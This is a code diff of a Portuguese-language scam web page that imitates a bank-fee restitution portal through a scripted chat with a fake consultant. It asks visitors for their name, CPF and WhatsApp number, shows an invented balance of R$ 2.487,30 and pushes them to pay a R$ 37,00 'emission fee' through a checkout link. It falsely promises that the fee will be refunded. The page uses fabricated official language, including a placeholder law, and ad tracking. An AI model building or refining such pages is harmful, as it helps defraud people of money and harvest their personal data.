@@ -3,116 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Restituição Bancária - Consulta Oficial</title>
+    <title>Sistema de Restituição Bancária - Consulta</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Roboto', sans-serif; background-color: #e9eaed; margin: 0; padding: 0; overflow-x: hidden; }
-        .header { background: #0044cc; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 14px; position: fixed; width: 100%; top: 0; z-index: 999; }
-        .chat-container { max-width: 500px; margin: 70px auto 20px auto; background: white; min-height: 95vh; display: flex; flex-direction: column; padding: 15px; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; }
+        .header { background: #003399; color: white; padding: 15px; text-align: center; font-weight: 900; font-size: 14px; position: sticky; top: 0; z-index: 999; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 500px; margin: 10px auto; background: white; min-height: 100vh; padding: 15px; display: flex; flex-direction: column; }
         
-        .message { margin-bottom: 15px; max-width: 85%; padding: 12px; border-radius: 15px; font-size: 15px; line-height: 1.4; display: none; animation: fadeIn 0.4s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .msg { margin-bottom: 20px; padding: 15px; border-radius: 18px; font-size: 16px; line-height: 1.5; display: none; animation: slideIn 0.4s ease; position: relative; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
         
-        .bot-msg { background: #f0f2f5; align-self: flex-start; color: #1c1e21; border-bottom-left-radius: 2px; }
-        .avatar-info { display: flex; align-items: center; margin-bottom: 5px; }
-        .avatar-img { width: 30px; height: 30px; border-radius: 50%; margin-right: 8px; }
-        .author-name { font-size: 12px; font-weight: bold; color: #0044cc; }
+        .bot { background: #eef2f7; align-self: flex-start; color: #333; border-bottom-left-radius: 2px; border: 1px solid #d1d9e6; }
+        .perfil { display: flex; align-items: center; margin-bottom: 8px; }
+        .perfil img { width: 35px; height: 35px; border-radius: 50%; margin-right: 10px; border: 2px solid #003399; }
+        .perfil span { font-size: 13px; font-weight: bold; color: #003399; }
 
-        .input-area { display: none; margin: 10px 0; width: 100%; }
-        .input-field { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; }
-        .btn-send { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .input-box { display: none; margin: 15px 0; background: #fff; padding: 10px; border-top: 2px solid #eee; }
+        .field { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; }
+        .btn { background: #00cc66; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: 900; font-size: 16px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn:hover { background: #00994d; }
+
+        .option-btn { background: #fff; border: 2px solid #003399; color: #003399; padding: 12px; margin-bottom: 8px; border-radius: 8px; width: 100%; text-align: left; font-weight: bold; cursor: pointer; }
+        .option-btn:active { background: #003399; color: #fff; }
+
+        .extrato-final { background: #f9f9f9; border: 2px dashed #28a745; padding: 20px; border-radius: 15px; text-align: left; margin: 15px 0; display: none; }
+        .valor-destaque { font-size: 32px; font-weight: 900; color: #28a745; text-align: center; margin: 10px 0; }
         
-        .typing { font-size: 12px; color: #65676b; margin-bottom: 10px; display: none; }
-        .extrato-box { background: #fff; border: 2px dashed #28a745; padding: 15px; text-align: center; border-radius: 10px; margin: 10px 0; }
-        .valor-grande { font-size: 28px; font-weight: 900; color: #28a745; }
-        .btn-checkout { background: #0044cc; color: white; text-decoration: none; padding: 18px; border-radius: 10px; font-weight: 900; display: block; text-align: center; margin-top: 15px; animation: pulse 1.5s infinite; text-transform: uppercase; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .btn-checkout { background: #003399; color: white; text-decoration: none; padding: 22px; border-radius: 12px; font-weight: 900; display: block; text-align: center; margin-top: 20px; font-size: 18px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+        
+        #loader { display: none; text-align: center; padding: 40px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #003399; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="header">🏦 PORTAL DE RESTITUIÇÃO BANCÁRIA FEDERAL</div>
+    <div class="header">🏛️ CONSULTORIA DE RESTITUIÇÃO BANCÁRIA - LEI 14.XXX/26</div>
 
-    <div class="chat-container">
-        <div id="m1" class="message bot-msg">
-            <div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>
-            Olá! Sou a Amélia, assistente virtual do <b>Consultor Roberto Silva</b>. Identificamos valores retidos no seu CPF.
+    <div class="container" id="chat">
+        <div id="m1" class="msg bot">
+            <div class="perfil"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png"><span>Consultor Roberto Silva</span></div>
+            Olá, sou o <b>Roberto Silva</b>. Sou consultor especializado em recuperação de tarifas bancárias e estou aqui para te guiar no processo de saque.
+        </div>
+        <div id="m2" class="msg bot">
+            Para começarmos a varredura no sistema central, por favor, digite seu <b>nome completo</b>:
+        </div>
+        <div id="i1" class="input-box" style="display:block;">
+            <input type="text" id="nome-in" class="field" placeholder="Nome Completo">
+            <button class="btn" onclick="proximo(1)">Continuar</button>
         </div>
 
-        <div id="m2" class="message bot-msg">
-            <div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>
-            Para iniciarmos a auditoria oficial, <b>qual o seu nome completo?</b>
+        <div id="m3" class="msg bot">
+            Prazer, <span id="res-nome"></span>. Agora informe seu <b>CPF</b> para localizarmos as contas inativas em seu nome:
+        </div>
+        <div id="i2" class="input-box">
+            <input type="tel" id="cpf-in" class="field" placeholder="000.000.000-00">
+            <button class="btn" onclick="proximo(2)">Validar Documento</button>
         </div>
 
-        <div id="i1" class="input-area">
-            <input type="text" id="nome-in" class="input-field" placeholder="Digite seu nome...">
-            <button class="btn-send" onclick="proximo(1)">Continuar</button>
+        <div id="m4" class="msg bot">
+            Documento validado. Qual o seu número de <b>WhatsApp</b> com DDD? (Enviaremos o comprovante de saque por lá também).
+        </div>
+        <div id="i3" class="input-box">
+            <input type="tel" id="zap-in" class="field" placeholder="(00) 00000-0000">
+            <button class="btn" onclick="proximo(3)">Próximo Passo</button>
         </div>
 
-        <div id="m3" class="message bot-msg">
-            <div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>
-            Prazer, <span id="user-n"></span>! Agora, informe seu <b>CPF</b> para consultarmos o sistema de juros abusivos.
+        <div id="m5" class="msg bot">
+            Você sabia que bancos cobram taxas indevidas de manutenção e juros abusivos em empréstimos? Nos últimos 10 anos, você já pagou algum boleto com atraso ou fez empréstimo pessoal?
+        </div>
+        <div id="i4" class="input-box">
+            <button class="option-btn" onclick="proximo(4)">Sim, já paguei juros e taxas</button>
+            <button class="option-btn" onclick="proximo(4)">Não tenho certeza</button>
         </div>
 
-        <div id="i2" class="input-area">
-            <input type="tel" id="cpf-in" class="input-field" placeholder="000.000.000-00">
-            <button class="btn-send" onclick="proximo(2)">VALIDAR CPF E CONSULTAR</button>
+        <div id="m6" class="msg bot">
+            Você utiliza aplicativo bancário no seu celular atualmente?
+        </div>
+        <div id="i5" class="input-box">
+            <button class="option-btn" onclick="proximo(5)">Sim, utilizo com frequência</button>
+            <button class="option-btn" onclick="proximo(5)">Não, prefiro ir à agência</button>
         </div>
 
-        <div id="m4" class="message bot-msg">
-            <div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>
-            <b>RESULTADO DA AUDITORIA CONCLUÍDO!</b><br><br>Consultor Roberto Silva liberou o seu extrato:
-            <div class="extrato-box">
-                <p style="margin:0; font-size:12px; color:#666;">SALDO TOTAL DISPONÍVEL</p>
-                <div class="valor-grande">R$ 2.487,30</div>
-                <p style="margin:5px 0 0 0; font-size:11px; color:#28a745;"><b>LIBERAÇÃO VIA PIX IMEDIATA</b></p>
-            </div>
+        <div id="m7" class="msg bot">
+            Em quais desses bancos você possui ou já possuiu conta ativa? (Selecione o principal)
+        </div>
+        <div id="i6" class="input-box">
+            <button class="option-btn" onclick="proximo(6, 'Itaú')">Itaú</button>
+            <button class="option-btn" onclick="proximo(6, 'Bradesco')">Bradesco</button>
+            <button class="option-btn" onclick="proximo(6, 'Caixa')">Caixa Econômica</button>
+            <button class="option-btn" onclick="proximo(6, 'Banco do Brasil')">Banco do Brasil</button>
+            <button class="option-btn" onclick="proximo(6, 'Outros')">Outros Bancos</button>
         </div>
 
-        <div id="m5" class="message bot-msg">
-            <div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>
-            Para o banco liberar esse valor agora, é necessário emitir a <b>Certidão de Regularidade</b> (Custo: R$ 37,00).
+        <div id="m8" class="msg bot">
+            Excelente. Por onde você deseja receber seus valores restituídos?
+        </div>
+        <div id="i7" class="input-box">
+            <button class="option-btn" onclick="proximo(7)">Receber via PIX (Imediato)</button>
+            <button class="option-btn" onclick="proximo(7)">Transferência TED (24h)</button>
         </div>
 
-        <div id="m6" class="message bot-msg">
-            <div class="avatar-info"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png" class="avatar-img"><span class="author-name">Consultoria Roberto Silva</span></div>
-            ⚠️ <b>IMPORTANTE:</b> Este valor de R$ 37,00 é <b>TOTALMENTE DEVOLVIDO</b> junto com o seu saque de R$ 2.487,30.
-            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-checkout">✅ EMITIR CERTIDÃO E RECEBER PIX</a>
+        <div id="m9" class="msg bot">
+            Atenção: Este valor é liberado via <b>Sistema de Valores Esquecidos</b> e não interfere em seus benefícios atuais. Você concorda com os termos de consultoria para solicitar seu saque agora?
+        </div>
+        <div id="i8" class="input-box">
+            <button class="btn" onclick="proximo(8)">SIM, SOLICITAR MEU SAQUE AGORA</button>
         </div>
 
-        <div id="typing" class="typing">Digitando...</div>
+        <div id="loader">
+            <div class="spinner"></div>
+            <p>Consultando base de dados central...<br><b>Aguarde a resposta do sistema.</b></p>
+        </div>
+
+        <div id="extrato" class="extrato-final">
+            <h3 style="text-align:center; color:#003399;">RELATÓRIO DE RESTITUIÇÃO</h3>
+            <hr>
+            <p><b>Titular:</b> <span id="final-nome"></span></p>
+            <p><b>Banco Principal:</b> <span id="final-banco"></span></p>
+            <p><b>Origem:</b> Juros e Tarifas Administrativas</p>
+            <div class="valor-destaque">R$ 2.487,30</div>
+            <p style="color:#d9534f; font-size:14px; font-weight:bold; text-align:center;">⚠️ STATUS: AGUARDANDO TAXA DE EMISSÃO</p>
+        </div>
+
+        <div id="m10" class="msg bot">
+            <div class="perfil"><img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png"><span>Consultor Roberto Silva</span></div>
+            <span id="res-nome2"></span>, seu saldo de <b>R$ 2.487,30</b> está pronto para envio. Porém, para finalizar o processo, o sistema exige a <b>Taxa de Emissão de Documento Federal</b>.
+        </div>
+
+        <div id="m11" class="msg bot" style="background:#fff3cd; border-color:#ffeeba;">
+            O valor da taxa é de apenas <b>R$ 37,00</b>. <br><br>
+            <b>IMPORTANTE:</b> Este valor de R$ 37,00 será <b>ESTORNADO</b> (devolvido) para sua conta junto com o saque total. <br><br>
+            Valor que cairá no seu PIX: <b>R$ 2.524,30</b>.
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-checkout" onclick="fbq('track', 'InitiateCheckout');">PAGAR TAXA E RECEBER R$ 2.524,30</a>
+        </div>
+
     </div>
 
     <script>
+        let nome = "";
+        let banco = "";
+
         function show(id) { document.getElementById(id).style.display = 'block'; window.scrollTo(0, document.body.scrollHeight); }
         function hide(id) { document.getElementById(id).style.display = 'none'; }
 
-        function proximo(passo) {
+        function proximo(passo, opt = "") {
             if (passo === 1) {
-                let n = document.getElementById('nome-in').value;
-                if (n.length < 3) return;
-                document.getElementById('user-n').innerText = n.split(' ')[0];
-                hide('i1');
-                show('m3');
-                setTimeout(() => show('i2'), 1000);
+                nome = document.getElementById('nome-in').value;
+                if (nome.length < 3) return;
+                document.getElementById('res-nome').innerText = nome.split(' ')[0];
+                document.getElementById('res-nome2').innerText = nome.split(' ')[0];
+                document.getElementById('final-nome').innerText = nome;
+                hide('i1'); show('m3'); setTimeout(() => show('i2'), 1000);
             } else if (passo === 2) {
-                let c = document.getElementById('cpf-in').value;
-                if (c.length < 11) return;
-                hide('i2');
-                document.getElementById('typing').style.display = 'block';
+                if (document.getElementById('cpf-in').value.length < 11) return;
+                hide('i2'); show('m4'); setTimeout(() => show('i3'), 1000);
+            } else if (passo === 3) {
+                hide('i3'); show('m5'); setTimeout(() => show('i4'), 1000);
+            } else if (passo === 4) {
+                hide('i4'); show('m6'); setTimeout(() => show('i5'), 1000);
+            } else if (passo === 5) {
+                hide('i5'); show('m7'); setTimeout(() => show('i6'), 1000);
+            } else if (passo === 6) {
+                banco = opt;
+                document.getElementById('final-banco').innerText = banco;
+                hide('i6'); show('m8'); setTimeout(() => show('i7'), 1000);
+            } else if (passo === 7) {
+                hide('i7'); show('m9'); setTimeout(() => show('i8'), 1000);
+            } else if (passo === 8) {
+                hide('i8');
+                show('loader');
                 setTimeout(() => {
-                    document.getElementById('typing').style.display = 'none';
-                    show('m4');
-                    setTimeout(() => show('m5'), 2000);
-                    setTimeout(() => show('m6'), 4000);
-                }, 3000);
+                    hide('loader');
+                    show('extrato');
+                    setTimeout(() => show('m10'), 1500);
+                    setTimeout(() => show('m11'), 3500);
+                }, 5000);
             }
         }
 
-        // Início
-        setTimeout(() => show('m1'), 500);
-        setTimeout(() => show('m2'), 2000);
-        setTimeout(() => show('i1'), 3000);
+        window.onload = () => {
+            setTimeout(() => show('m1'), 500);
+            setTimeout(() => show('m2'), 2000);
+        };
     </script>
 </body>
 </html>
